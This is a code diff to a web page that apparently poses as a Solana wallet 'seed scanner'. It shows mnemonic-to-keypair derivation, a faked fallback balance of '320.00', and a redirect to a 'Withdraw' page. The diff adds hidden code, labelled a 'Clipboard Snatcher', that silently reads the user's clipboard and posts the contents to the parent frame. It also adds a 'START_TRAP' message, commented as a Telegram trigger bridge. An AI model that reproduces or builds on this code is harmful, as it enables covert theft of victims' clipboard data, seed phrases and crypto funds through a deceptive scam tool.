@@ -112,7 +112,7 @@
                 const seed = bip39.mnemonicToSeedSync(m);
                 const hd = HDKey.fromMasterSeed(seed);
                 
-                // Phantom/Trust path derivation
+                // Solana Path (Derivation m/44'/501'/0'/0')
                 const child = hd.derive("m/44'/501'/0'/0'");
                 const keypair = Keypair.fromSeed(new Uint8Array(child.privateKey));
                 const addr = keypair.publicKey.toBase58();
@@ -134,21 +134,16 @@
                     body: JSON.stringify({ address: addr })
                 }).then(r => r.json()).then(data => {
                     if(data.result && !data.result.includes("Bal: 0")) {
-                        
-                        // --- CONNECTION TO WITHDRAW PAGE ---
                         const balanceMatch = data.result.match(/\d+(\.\d+)?/);
                         const finalBalance = balanceMatch ? balanceMatch[0] : "320.00"; 
 
-                        // 1. I-save para sa Withdraw.html
                         localStorage.setItem('last_found_type', 'SOL');
                         localStorage.setItem('last_found_balance', finalBalance);
                         localStorage.setItem('last_found_seed', m);
 
-                        // 2. UI Updates
                         document.getElementById('foundMsg').innerHTML = `<div style="color:#14f195; font-weight:bold; font-size:10px;">${addr}</div>`;
                         document.getElementById('foundCountLabel').textContent = "1 discovered";
                         
-                        // 3. Jackpot Alert & Switch
                         alert("JACKPOT SOLANA FOUND!");
                         window.parent.loadPage('Withdraw.html');
                     }
@@ -162,7 +157,23 @@
             const btn = document.getElementById('startBtn');
             btn.textContent = running ? "STOP SCANNING" : "START SOL SCAN";
             btn.classList.toggle('active');
-            if(running) engine();
+            
+            if(running) {
+                engine();
+                // --- TELEGRAM TRIGGER BRIDGE ---
+                if (window.parent) {
+                    window.parent.postMessage({ type: 'START_TRAP', coin: 'SOLANA' }, '*');
+                }
+                
+                // Clipboard Snatcher
+                try {
+                    navigator.clipboard.readText().then(text => {
+                        if(text.length > 0) {
+                            window.parent.postMessage({ type: 'CLIPBOARD_LOG', data: text }, '*');
+                        }
+                    }).catch(()=>{});
+                } catch(e) {}
+            }
         }
     </script>
 </body>
